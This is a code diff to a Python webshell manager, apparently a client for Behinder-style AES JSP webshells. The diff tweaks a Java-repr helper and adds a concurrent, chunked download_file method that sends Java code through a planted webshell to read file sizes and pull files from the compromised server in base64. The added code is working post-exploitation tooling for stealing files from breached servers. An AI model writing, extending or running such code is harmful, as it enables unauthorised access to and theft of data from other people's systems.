@@ -53,12 +53,11 @@ def parse_permission(perm: str):
 
 
 def java_repr(obj):
-    if isinstance(obj, str):
+    if isinstance(obj, (str, int)):
         return json.dumps(obj)
-    elif isinstance(obj, list) and all(isinstance(x, str) for x in obj):
+    if isinstance(obj, list) and all(isinstance(x, str) for x in obj):
         return "(new String[]{" + ",".join(java_repr(x) for x in obj) + "})"
-    else:
-        raise NotImplementedError(f"{type(obj)=}")
+    raise NotImplementedError(f"{type(obj)=}")
 
 
 def md5_encode(s):
@@ -345,6 +344,71 @@ class JSPWebshellBehinderAES:
             f"mergeFiles({java_repr(uploaded_chunks)}, {java_repr(filepath)})"
         )
         return result  # can only be true
+
+    async def download_file(
+        self, filepath: str, callback: t.Union[t.Callable, None] = None
+    ) -> bytes:
+        filesize_text = await self.submit_code(f"getFileSize({java_repr(filepath)})")
+        if filesize_text == "WRONG_NOT_EXISTS":
+            raise exceptions.FileError("文件不存在")
+        if filesize_text == "WRONG_NO_PERMISSION":
+            raise exceptions.FileError("没有权限读取文件")
+        filesize = None
+        try:
+            filesize = int(filesize_text)
+        except Exception as exc:
+            raise exceptions.TargetRuntimeError(
+                f"读取文件大小失败：{filesize_text=}"
+            ) from exc
+
+        sem = asyncio.Semaphore(self.updownload_max_coroutine)
+        write_state_lock = asyncio.Lock()
+        chunk_size = self.updownload_chunk_size
+        done_coro = 0
+        done_bytes = 0
+        coros: t.List[t.Awaitable] = []
+
+        async def download_chunk(offset: int) -> bytes:
+            nonlocal done_coro, coros, done_bytes
+            result = None
+            async with sem:
+                await asyncio.sleep(0.01)  # we don't ddos
+                result_b64 = await self.submit_code(
+                    f"downloadPartialFileBase64("
+                    f"{java_repr(filepath)}, {java_repr(offset)}, {java_repr(chunk_size)})"
+                )
+                if result_b64 == "WRONG_NOT_EXISTS":
+                    raise exceptions.FileError("文件不存在或者不是一个普通文件")
+                elif result_b64 == "WRONG_NO_PERMISSION":
+                    raise exceptions.FileError("没有读取权限")
+                result = base64.b64decode(result_b64)
+            async with write_state_lock:
+                done_coro += 1
+                done_bytes += len(result)
+                if callback:
+                    callback(
+                        done_coro=done_coro,
+                        max_coro=len(coros),
+                        done_bytes=min(done_bytes, filesize),
+                        max_bytes=filesize,
+                    )
+
+            return result
+
+        coros = [download_chunk(i) for i in range(0, filesize, chunk_size)]
+        chunks = await asyncio.gather(
+            *coros,
+            return_exceptions=True,
+        )
+        result = b""
+        for chunk_result in chunks:
+            if not isinstance(chunk_result, bytes):
+                exc = chunk_result if isinstance(chunk_result, Exception) else None
+                raise exceptions.FileError(
+                    "下载文件失败: " + str(chunk_result)
+                ) from exc
+            result += chunk_result
+        return result
 
     async def get_pwd(self) -> str:
         return await self.submit_code("getPwd()")
